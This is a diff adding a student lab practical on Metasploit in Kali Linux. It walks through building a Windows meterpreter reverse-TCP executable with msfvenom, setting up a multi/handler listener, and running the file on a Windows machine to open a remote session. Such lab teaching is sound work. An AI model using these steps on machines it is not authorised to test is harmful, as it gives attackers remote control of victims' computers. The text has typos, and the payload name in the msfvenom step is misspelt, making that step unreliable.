@@ -1,0 +1,26 @@
+Practical No:-10
+Aim :- Using Metasploit to exploit (Kali Linux)
+Steps: 1. Before starting Kali Linux on your Virtual Machine go to the Setting- >Network and set the Adapter as a Bridged Adapter i.e., given below
+After that start your virtual machine 
+2. Open Kali-Linux Terminal and Check the IP address of your machine usingthe below command 
+
+$ifconfig 
+
+3. Start the postgresql service using the below command $service postgresql start
+
+4. Then go to the console window of Metasploit using below command $msfconsole
+
+5. Now host your msfvenom on the specific IP address to start Metasploit usingbelow 
+command $msfvenom -p windows/metrpreter/reverse_tcp LHOST=192.168.0.101LPORT=4444 -f exe >kale.exe 
+
+6. To start exploit configure the setting in exploit/multi/handler folder Change the directory to exploit/multi/handler using below command $useexploit/multi/handler
+Then set payload, host, and port to exploit using below command $set payload windows/meterpreter/reverse_tcp 
+
+$set LHOST=192.168.0.101 
+
+$set LPORT=4444
+
+7. To start Metasploit write the belowcommand $exploit
+
+After that go to your windows and run that exe (Kale.exe) file then the session willstart on your virtual machine 8. When the session will start then give the below command to check the yourMetasploit is working or not $sysinfo 
+
